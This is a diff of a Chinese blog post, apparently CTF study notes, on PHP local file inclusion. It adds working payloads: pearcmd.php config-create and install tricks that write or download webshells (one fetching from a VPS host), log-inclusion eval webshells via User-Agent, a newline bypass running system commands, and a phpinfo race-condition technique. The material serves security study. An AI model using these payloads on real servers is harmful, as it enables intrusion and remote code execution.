@@ -45,7 +45,7 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file://     --访问本地文件系统</span><br><span class="line">http://     --访问http(s)网址</span><br><span class="line">ftp://      --访问FTP(s) URLs</span><br><span class="line">php://      --访问各个输入/输出流</span><br><span class="line">zlib://     --压缩流</span><br><span class="line">data://     --数据</span><br><span class="line">phar://     --PHP归档</span><br></pre></td></tr></table></figure>
 
 <h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><em>不受allow_url_fopen以及allow_url_include的影响</em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file = php://filter/read=convert.base64-encode/resource=flag.php   # 得到base64编码格式的php文件。如果不加read读取链，则会将其中的内容当作PHP代码执行，则无法读取到其中的文件内容，所以要在read读取链中将其编码</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php   # 得到base64编码格式的php文件。如果不加read读取链，则会将其中的内容当作PHP代码执行，则无法读取到其中的文件内容，所以要在read读取链中将其编码</span><br><span class="line">?file=php://filter/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure>
 
 <p>在看PHP:&#x2F;&#x2F;filter底层代码分析得时候，看到了一种形式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=a/convert.base64-decode/…/…/a.txt</span><br></pre></td></tr></table></figure>
@@ -83,6 +83,50 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <p>此伪协议就是远程文件包含漏洞。可通过其他主机getshell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://localhost/1.php</span><br></pre></td></tr></table></figure>
 
+<h2 id="pearcmd-php-的利用"><a href="#pearcmd-php-的利用" class="headerlink" title="pearcmd.php 的利用"></a>pearcmd.php 的利用</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl&#x2F;pear 是默认安装的；在 7.4 及以后，需要在编译 PHP 的时候指定 <code>--with-pear</code> 才会安装</p>
+<p>在 Docker 任意版本镜像中，pcel&#x2F;pear 都会被默认安装，安装的路径在 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create &lt;directory&gt; &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+<p>这个命令使用 <code>config-create</code> 模式，表明要创建一个配置文件</p>
+<p>Docker 环境下的 php.ini 会默认开启 <code>register_argc_argc</code> 配置，该配置的作用大概是将用户的输入赋予 <code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code> 这几个变量。如果 PHP 以 Server 的形式运行，HTTP 数据包中的 query-string 会被作为 <code>$_SERVER[&#39;argv&#39;]</code> 的值，而 pear 可以通过 <code>readPHPArgv</code> 函数获得我们传入的 <code>$_SERVER[&#39;argv&#39;]</code> </p>
+<blockquote>
+<p>RFC3875 中规定，如果 query-string 中不包含没有编码的 &#x3D;，且请求是 GET 或 HEAD，则 query-string 需要被作为命令行参数。<br>但 PHP 没有严格按照 RFC 来处理，即使我们传入的 query-string 包含等号，也仍会被赋值给 <code>$_SERVER[&#39;argv&#39;]</code>。</p>
+</blockquote>
+<p>开启这个配置后，我们的 get 请求参数会被读取进 <code>$_SERVER[&#39;argv&#39;]</code> 中，这个值是通过传进来内容中的 <code>+</code> 来进行分隔的</p>
+<h3 id="利用-payload"><a href="#利用-payload" class="headerlink" title="利用 payload"></a>利用 payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);phpinfo()?&gt;+/var/www/html/a.php</span><br></pre></td></tr></table></figure>
+
+<p>由于包含了 pearcmd.php，那么接收到的参数会传入 pear 工具，等价于执行以下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create /&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);phpinfo()?&gt; /var/www/html/a.php</span><br></pre></td></tr></table></figure>
+
+<p>这条命令会把含有一句话木马的字符串写入到 &#x2F;var&#x2F;www&#x2F;html&#x2F;a.php 文件中</p>
+<p>注意：请求里的尖括号会被 url 编码，需要使用 burpsuit 抓包，修改回原来的符号</p>
+<p>此时再去包含生成的 &#x2F;var&#x2F;www&#x2F;html&#x2F;a.php 文件，即可执行 phpinfo ；或利用蚁剑连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=a.php</span><br></pre></td></tr></table></figure>
+
+<p>此外，还有其它的利用方式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps-ip]:[port]/test1.php</span><br></pre></td></tr></table></figure>
+
+<p>该 payload 会通过 <code>install</code> 远程下载 shell，在有回显的情况下，服务器会回显下载的目录</p>
+<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>如果 php 存在本地包含漏洞，但无法上传文件，也可以考虑包含日志文件获取 webshell，该方法需要开启服务器日志记录功能</p>
+<p>访问日志的位置和文件名在不同的系统上会有所差异</p>
+<ul>
+<li>Apache 一般为 <strong>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</strong></li>
+<li>Nginx 一般为 <strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong> 和 <strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</strong></li>
+<li>IIS 一般为 <strong>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</strong></li>
+</ul>
+<p>Apache 运行后一般会生成两个日志文件，一个是访问日志，一个是错误日志。访问日志记录了客户端的每次请求及服务器响应的相关信息</p>
+<p>当访问一个不存在的资源时，日志同样会记录，例如访问 <code>http://127.0.0.1/&lt;?php phpinfo();?&gt;</code> 。Apache会记录请求 <code>&lt;?php phpinfo();?&gt;</code> </p>
+<p>因此可以将 payload 写入到 access.log 中，然后去包含该日志： <code>?file=../../../../var/log/nginx/access.log</code> </p>
+<blockquote>
+<p>需要注意，写入 payload 需要利用 burpsuit 抓包去写，如果直接在地址栏中输入，一句话木马会被编码，无法包含</p>
+</blockquote>
+<p>此外，也可以将 payload 写入 headers，如往 User-Agent 写入 <code>&lt;?php eval($_GET[2]);?&gt;</code> ，然后便可以使用 Webshell连接工具进行连接，或者直接进行命令执行 <code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();</code></p>
+<h3 id="Docker-环境下的日志包含"><a href="#Docker-环境下的日志包含" class="headerlink" title="Docker 环境下的日志包含"></a>Docker 环境下的日志包含</h3><p>但如果目标在 Docker 环境中，会有以下特点：</p>
+<ul>
+<li>容器只会运行Apache，所以没有第三方软件日志</li>
+<li>Web日志重定向到了 &#x2F;dev&#x2F;stdout、&#x2F;dev&#x2F;stderr</li>
+</ul>
+<p>此时包含这些 Web 日志会出现 <code>include(/dev/pts/0): failed to open stream: Permission denied</code> 的错误，因为PHP没有权限包含设备文件</p>
+<p>所以，这种情况下利用日志包含来 getshell 的方法就无法进行</p>
 <h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="限制后缀"><a href="#限制后缀" class="headerlink" title="限制后缀"></a>限制后缀</h3><p>有一些开发者会限制文件的后缀，如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;] . &#x27;.php&#x27;;</span><br><span class="line">    echo $file;</span><br><span class="line">    include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>在下面条件时，可以使用%00截断</p>
@@ -103,10 +147,11 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 </ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;data&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;return is true&quot;</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;return is false&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>file_get_contents(“php:&#x2F;&#x2F;input”)能够获取到原始请求的数据流，在提交后用burp抓包，post提交xxx后成功</p>
-<p>除此之外，还有一些php伪协议也可以被file_get_contents函数执行，如：</p>
+<p><code>file_get_contents(&quot;php://input&quot;)</code> 能够获取到原始请求的数据流，在提交后用 burp 抓包，post 提交 <code>xxx</code> 后成功</p>
+<p>除此之外，还有一些 php 伪协议也可以被 <code>file_get_contents</code> 函数执行，如：</p>
 <ul>
-<li>php:&#x2F;&#x2F;stdout,php:&#x2F;&#x2F;stdin,php:&#x2F;&#x2F;stderr等</li>
+<li><code>php://stdout</code>, <code>php://stdin</code>, <code>php://stderr</code> 等</li>
+<li><code>data://text/plain,xxx</code></li>
 </ul>
 <h3 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents 函数"></a>file_put_contents 函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
 
@@ -119,18 +164,11 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <p>并在post中写入一句话，即可成功执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
 
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过 #"></a>绕过 <code>#</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
-<h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含 Apache (或 Nginx)日志文件也可以获取 WebShell</p>
-<ul>
-<li>apache 日志文件路径一般是 <code>/var/log/apache/access.log</code> : Apache 的访问日志文件记录了客户端的每次请求及服务器响应的相关信息</li>
-<li>nginx 的 log 在 <code>/var/log/nginx/access.log</code> 和 <code>/var/log/nginx/error.log</code></li>
-</ul>
-<p>当访问一个不存在的资源时，日志同样会记录，例如访问 <code>http://127.0.0.1/&lt;?php phpinfo();?&gt;</code> 。Apache会记录请求 <code>&lt;?php phpinfo();?&gt;</code> </p>
-<p>因此可以将 payload 写入到 access.log 中，然后去包含该日志： <code>?file=../../../../var/log/nginx/access.log</code> </p>
-<blockquote>
-<p>需要注意，写入 payload 需要利用 burpsuit 抓包去写，如果直接在地址栏中输入，一句话木马会被编码，无法包含</p>
-</blockquote>
-<p>此外，也可以将 payload 写入 headers，如往 User-Agent 写入 <code>&lt;?php eval($_GET[2]);?&gt;</code> ，然后便可以使用 Webshell连接工具进行连接，或者直接进行命令执行 <code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();</code></p>
+<p>构造换行符进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a system(&#x27;cat /fl*&#x27;);</span><br></pre></td></tr></table></figure>
+
 <h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>Nginx错误配置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;               # location /Purl 为普通匹配，Purl和用户请求url的开头相同就匹配成功。如请求是www.mysite.com/static/img/1.jpg</span><br><span class="line">    Alias /home/myapp/static/;  # alias指令是在其定义的目录下查找文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>如果配置文件包含上述内容，很可能是运维人员或开发人员想让用户访问static目录(一般是静态资源目录)</p>
@@ -168,4 +206,12 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 </ol>
 <p>该配置选项默认值为 <code>0</code>，这样用户可以自定义 session ID</p>
 <p>比如在 cookie 中设置 <code>PHPSESSID=MySession</code>，便会在服务器 <code>/tmp</code> 目录或者 <code>/var/lib/php/sessions/</code> 下创建一个文件： <code>sess_MySession</code> 。即便没有设置自动初始化 session，php 也会产生 session，并生成一个键值，这个键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)</code> + <code>session.upload_progress.name</code> 值组成，最后被一起写入 <code>sess_</code> 文件里</p>
+<h3 id="条件竞争与-phpinfo"><a href="#条件竞争与-phpinfo" class="headerlink" title="条件竞争与 phpinfo"></a>条件竞争与 phpinfo</h3><p>对任意一个 PHP 文件发送一个上传的数据包时，不管这个 PHP 服务后端是否有处理 <code>$_FILES</code> 的逻辑，PHP 都会将用户上传的数据先保存到一个临时文件中，这个文件一般位于系统临时目录，文件名是 php 开头，后面跟 6 个随机字符；在整个 PHP 文件执行完毕后，这些上传的临时文件就会被清理掉</p>
+<p>我们可以包含这个临时文件，最后完成 getshell 操作。但这里面的问题在于我们不知道临时文件的文件名</p>
+<p>所以这个利用的<strong>条件</strong>就是，需要有一个地方能获取到文件名，例如 phpinfo。<strong>phpinfo 页面</strong>中会输出这次请求的所有信息，包括 <code>$_FILES</code> 变量的值，其中包含完整文件名</p>
+<p>然后利用条件竞争，用两个以上的线程来利用，其中一个发送上传包给 phpinfo 页面，并读取返回结果，找到临时文件名；第二个线程拿到这个文件名后马上进行包含利用</p>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">exp.py</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP 裸文件本地包含综述</a></li>
+</ol>
 </div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-10-08</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/10/08/文件包含/,Mini's blog,文件包含,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/10/18/SSRF/" title="SSRF">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/10/06/Command-Execution/" title="命令执行">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
